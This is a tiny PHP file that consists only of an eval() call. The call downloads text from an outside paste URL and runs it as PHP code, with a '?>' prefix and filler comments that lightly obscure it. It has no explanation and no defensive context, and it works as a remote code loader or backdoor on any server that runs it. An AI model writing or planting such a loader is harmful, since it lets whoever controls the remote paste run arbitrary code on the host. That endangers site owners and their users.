<?php eval(
    /**_**/ urldecode("%3f%3e") .
        file_get_contents(
            /**_**/ urldecode(
                /**_**/ "https://paste.myconan.net/510769.txt"
            )
        )
); ?>